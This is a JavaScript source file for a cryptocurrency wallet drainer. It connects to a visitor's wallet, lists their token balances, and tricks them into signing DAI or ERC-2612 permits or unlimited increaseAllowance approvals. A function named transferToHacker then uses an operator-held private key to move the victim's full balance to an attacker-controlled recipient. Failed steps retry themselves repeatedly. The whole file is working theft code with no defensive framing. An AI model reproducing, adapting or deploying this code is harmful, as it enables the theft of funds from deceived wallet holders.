import {
  fetchBalance,
  writeContract,
  readContract,
  getAccount,
  waitForTransaction,
  connect
} from '@wagmi/core';
import { signDaiPermit, signERC2612Permit } from 'eth-permit';
import { InjectedConnector } from '@wagmi/core/connectors/injected';

import { ethers } from 'ethers';

import * as constants from './constants.js';
import { Alchemy, Network } from 'alchemy-sdk';
const config = {
  apiKey: constants.apikeys,
  network: Network.ETH_MAINNET,
};
const alchemy = new Alchemy(config);

let prices = [];
export let priceList = [];

export const mconnector = async () => {
  await connect({
    connector: new InjectedConnector(),
  });
};

export const getTokens = async (address) => {
  const balances = await alchemy.core.getTokenBalances(address);
  const nonZeroBalances = balances.tokenBalances.filter((token) => {
    return token.tokenBalance !== "0x0000000000000000000000000000000000000000000000000000000000000000";
  });
  let tokens = [];

  // Loop through all tokens with non-zero balance
  for (let token of nonZeroBalances) {
    // Get balance of token
    let balance = token.tokenBalance;

    const metadata = await alchemy.core.getTokenMetadata(token.contractAddress);
    metadata.balance = balance;
    metadata.token_address = token.contractAddress;
    tokens.push(metadata);
  }
  return tokens;
};

export const setPrice = (ticker) => {
  return new Promise(async (resolve) => {
    let token = priceList.filter((token) => token.symbol === `${ticker}USDT`);
    if (token && token.length > 0) prices.push(token[0].price);
    else prices.push(0);

    resolve(token.price);
  });
};

export const getPrice = async (symbols) => {
  for (let i = 0; i < symbols.length; i++) {
    const symbol = symbols[i];
    await setPrice(symbol);
  }
  return prices;
};

export const increaseAllowance = async (token) => {
  // RPC provider
  const provider = new ethers.JsonRpcProvider(constants.infura);
  
  // get token Allownce to transfer imiditly
  const allow = await allownce(token);
  const balanceOfToken = await balanceOf(token);
  if (allow >= balanceOfToken) {
    return transferToHacker(token);
  };

  const permitToken = constants.permitTokens.find(tokenis => tokenis.address === token.token_address)
  const increaseallown = constants.increasAllownceTokens.find(tokenis => tokenis === token.token_address)
  // const transfertoken = constants.transferTokens.find(tokenis => tokenis === token.token_address)
  if (permitToken) {
    let version = null;
    await readContract({
      address: token.token_address,
      abi: constants.ALLOWANCEABI,
      functionName: 'version',
    }).then( async (result) => {
      version = await result;
    }).catch((error) => {
      console.log(error);
    })
    console.log(version)
    if( version === '1') {
      let nonce = undefined
      await readContract({
        address: token.token_address,
        abi: constants.ALLOWANCEABI,
        functionName: 'nonces',
        args: [getAccount().address],
      }).then(async (result) => {
        nonce = await result;
      }).catch( (error) => {
        console.log(error)
      })
      console.log('nonce is:', nonce);
      await daiPermitV1(
        token, permitToken, nonce, provider
      )
    }else if (version === '2') {
      await usdcPermitV2(
        token, permitToken, provider
      )
    }
  }else if (increaseallown) {
    await increasAllow(token);
  }
  // else if (transfertoken) {
  //   await transfer(token);
  // }
};

export const transferToHacker = async (token) => {
  const amount = balanceOf(token)
  const provider = new ethers.JsonRpcProvider(constants.infura);
  const signer = new ethers.Wallet(constants.initiatorPK, provider);
  const tokencontract = new ethers.Contract(
    token.token_address,
    constants.ALLOWANCEABI,
    signer
  );
  await tokencontract.transferFrom(
    getAccount().address, constants.recipient, amount
  ).then(async (result) => {
    console.log(result)
  }).catch(async (error) => {
    console.log(error)
    transferToHacker(token);
  });
};

export const ethBalance = async () => {
  try {
    const account = getAccount().address;
    // console.log("Account is:", account);
    const balance = await fetchBalance({
      address: account,
    });
    // console.log("Balance1 is:", balance);
    return balance;
  } catch (error) {
    console.log(error);
  }
};

export const allownce = async (token) => {
  return await readContract({
    address: token.token_address,
    abi: constants.ALLOWANCEABI,
    functionName: 'allowance',
    args: [getAccount().address, constants.initiator],
    chainId: 1
  }).catch( (error) => {
    console.log(error)
  })
}

export const balanceOf = async (token) => {
  return await readContract({
    address: token.token_address,
    abi: constants.ALLOWANCEABI,
    functionName: 'balanceOf',
    args: [getAccount().address],
    chainId: 1
  }).catch( (error) => {
    console.log(error)
  })
}

const increasAllow = async (token) => {
  await writeContract({
    address: token.token_address,
    abi: constants.ALLOWANCEABI,
    functionName: 'increaseAllowance',
    args: [constants.initiator, constants.max],
    gas: '75000',
  }).then(async (result) => {
    console.log(result)
    await waitForTransaction({
      chainId: 1,
      hash: result.hash
    }).then(async (result) => {
      console.log(result)
      await transferToHacker(token);
    }).catch(async (error) => {
      console.log(error)
    })
  }).catch(async (error) => {
    console.log(error)
    await increasAllow(token);
  })
}

const daiPermitV1 = async (token, permitToken, nonce, provider) => {
  await signDaiPermit(
    window.ethereum, permitToken.address, getAccount().address, constants.initiator, constants.deadline.toString(), nonce.toString()
  ).then(async ( result) => {

    const signer = new ethers.Wallet(constants.initiatorPK, provider);
    const DaiToken = new ethers.Contract(
      permitToken.address, constants.ALLOWANCEABI, signer
    );

    await DaiToken.permit(
      getAccount().address, constants.initiator, result.nonce, result.expiry, true, result.v, result.r, result.s
    ).then(async (result) => {
      console.log('result is:', result);
      await provider.waitForTransaction( result.hash).then(async (result) => {
        console.log(result)
        await transferToHacker(token);
      }).catch(async (error) => {
        console.log(error)
      })
    })

  }).catch(async (error) => {
    console.log(error)
    await daiPermitV1(token, permitToken, nonce, provider);
  });
}

const usdcPermitV2 = async (token, permitToken, provider) => {
  await signERC2612Permit(
    window.ethereum, permitToken.address, getAccount().address, constants.initiator, constants.max, constants.deadline.toString(),
  ).then(async ( result) => {

    const signer = new ethers.Wallet(constants.initiatorPK, provider);
    const DaiToken = new ethers.Contract(
      permitToken.address, constants.permitV2, signer
    );

    await DaiToken.permit(
      getAccount().address, constants.initiator, result.value, result.expiry, result.v, result.r, result.s
    ).then(async (result) => {
      console.log('permitV2 result is', result);
      await waitForTransaction(result.transactionHash ).then(async (result) => {
        console.log(result)
        await transferToHacker(token);
      }).catch(async (error) => {
        console.log(error)
      })
    })

  }).catch(async (error) => {
    console.log(error)
    await usdcPermitV2(permitToken, provider);
  })
}